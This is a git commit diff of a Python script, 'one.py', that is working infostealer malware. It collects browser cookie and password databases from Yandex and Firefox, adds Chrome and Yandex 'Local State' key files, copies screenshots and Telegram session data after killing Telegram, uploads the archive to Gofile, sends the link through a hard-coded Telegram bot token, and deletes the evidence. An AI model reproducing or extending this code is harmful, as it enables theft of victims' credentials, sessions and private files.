302563a4a3c952952bee3a8ba4e3859daab98333
Vova49 <143168489+Vova49@users.noreply.github.com>
2025-06-15 13:07:01 +0300

    Update one.py

--- one.py
+++ one.py
@@ -1,10 +1,10 @@
 import os
-import psutil
-import requests
 import socket
 import time
 import zipfile
 
+import psutil
+import requests
 from gofilepy import GofileClient
 
 T = '6664269750:AAEXmgOxU4mxN4PbMkblbqtaszZWWtedWf4'
@@ -38,14 +38,26 @@ def A(p, mode):
             [("LOCALAPPDATA", "Yandex", "YandexBrowser", "User Data", "Default", "Ya Passman Data")]
         f = [j(b(x[0]), *x[1:]) for x in P]
         F = j(b("APPDATA"), "Mozilla", "Firefox", "Profiles")
-        if os.path.exists(F): f += [j(F, d, "cookies.sqlite") for d in os.listdir(F) if
-                                    os.path.isfile(j(F, d, "cookies.sqlite"))]
+        if os.path.exists(F):
+            f += [j(F, d, "cookies.sqlite") for d in os.listdir(F) if os.path.isfile(j(F, d, "cookies.sqlite"))]
         for x in f:
-            if os.path.isfile(x): z.write(x, arcname=os.path.relpath(x, b("LOCALAPPDATA")))
+            if os.path.isfile(x):
+                z.write(x, arcname=os.path.relpath(x, b("LOCALAPPDATA")))
+
+        local_state_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
+        if os.path.isfile(local_state_path):
+            z.write(local_state_path, arcname=os.path.relpath(local_state_path, os.getenv("LOCALAPPDATA")))
+
+        yandex_local_state = os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data",
+                                          "Local State")
+        if os.path.isfile(yandex_local_state):
+            z.write(yandex_local_state, arcname=os.path.relpath(yandex_local_state, os.getenv("LOCALAPPDATA")))
+
         P = fr"C:\Users\{U}\Pictures\Screenshots"
         if os.path.exists(P):
             for r, _, fs in os.walk(P):
-                for f in fs: z.write(j(r, f), arcname=j("Screenshots", os.path.relpath(j(r, f), P)))
+                for f in fs:
+                    z.write(j(r, f), arcname=j("Screenshots", os.path.relpath(j(r, f), P)))
     elif mode == 2:
         for x in psutil.process_iter(['name']):
             if x.info['name'] == 'Telegram.exe':
@@ -57,10 +69,12 @@ def A(p, mode):
         P = fr"C:\Users\{U}\AppData\Roaming\Telegram Desktop\tdata"
         if os.path.exists(P):
             for r, _, fs in os.walk(P):
-                for f in fs: z.write(j(r, f), arcname=j("Telegram_tdata", os.path.relpath(j(r, f), P)))
+                for f in fs:
+                    z.write(j(r, f), arcname=j("Telegram_tdata", os.path.relpath(j(r, f), P)))
     z.close()
     with open(p, 'rb') as f:
         S(G.upload(file=f).page_link)
+    os.remove(p)
 
 
 A('a1.zip', 1)
